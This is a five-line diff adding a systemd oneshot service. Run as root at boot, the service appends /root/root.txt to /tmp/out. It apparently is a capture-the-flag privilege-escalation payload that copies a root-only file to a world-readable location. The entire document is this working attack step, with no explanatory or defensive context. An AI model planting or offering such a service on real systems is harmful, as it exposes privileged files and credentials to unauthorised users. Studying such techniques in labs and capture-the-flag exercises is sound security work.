@@ -1,0 +1,5 @@
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt >> /tmp/out"
+[Install]
+WantedBy=multi-user.target
